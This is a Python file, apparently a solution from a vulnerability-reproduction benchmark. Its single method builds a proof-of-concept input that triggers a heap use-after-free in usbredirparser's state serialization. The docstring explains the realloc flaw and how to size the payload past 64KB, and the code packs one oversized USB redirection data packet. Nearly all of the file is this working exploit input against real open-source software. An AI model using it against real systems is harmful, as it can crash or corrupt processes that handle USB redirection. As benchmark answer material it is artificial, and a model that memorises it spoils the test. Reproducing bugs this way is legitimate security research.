import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) to trigger a Heap Use After Free
        vulnerability in the usbredirparser serialization process.

        The vulnerability occurs when serializing a parser state with a large
        amount of buffered write data, causing the total serialized size to
        exceed the initial buffer size (64KB). This triggers a realloc,
        invalidating a pointer to the write buffer count field, leading to a
        use-after-free when the count is updated.

        To trigger this, we need to create a parser state that, when serialized,
        requires more than 64KB. The serialized state consists of a fixed-size
        prefix (~60 bytes) and the data for the buffered writes. Each buffered
        write is serialized as its length (4 bytes) followed by the data itself.

        The PoC consists of a single `USB_PACKET_TYPE_DATA_PACKET`. When parsed
        in an environment where writes are blocked (as the test harness will
        simulate), this packet's data will be added to the parser's write buffer.

        To minimize the PoC size while ensuring the vulnerability is triggered,
        we use one large packet. The PoC size is determined by the packet headers
        and the payload size (S). The serialized size is determined by the
        prefix and the serialized buffer size (4 + S).

        Calculation:
        - Initial buffer size: 65536 bytes
        - Serialized prefix size: ~60 bytes
        - We need: 60 (prefix) + 4 (len) + S (payload) > 65536
        - S > 65536 - 64 = 65472
        - We choose a payload size that robustly exceeds this threshold.
          Using a round number like 65536 provides a good safety margin.
        """

        # A payload size that reliably causes the serialized state to exceed 64KB.
        payload_size = 65536

        # From usbredirproto.h
        USB_PACKET_TYPE_DATA_PACKET = 10
        
        # struct usb_redir_header { uint32_t type; uint32_t length; }
        header_format = "<II"
        
        # struct usb_redir_data_packet { uint8_t endpoint; uint32_t length; }
        data_packet_header_format = "<BI"
        
        # Size of the usb_redir_data_packet struct
        data_packet_header_size = 5
        
        # The 'length' in the main header covers everything after it.
        header_length = data_packet_header_size + payload_size
        
        # Endpoint must be > 0 for data packets.
        endpoint = 1
        
        # Construct the main packet header.
        header = struct.pack(
            header_format,
            USB_PACKET_TYPE_DATA_PACKET,
            header_length
        )
        
        # Construct the data packet specific header.
        data_packet_header = struct.pack(
            data_packet_header_format,
            endpoint,
            payload_size
        )
        
        # The payload content is irrelevant for triggering this vulnerability.
        payload = b'\x00' * payload_size
        
        # Assemble the final PoC packet.
        poc = header + data_packet_header + payload
        
        return poc
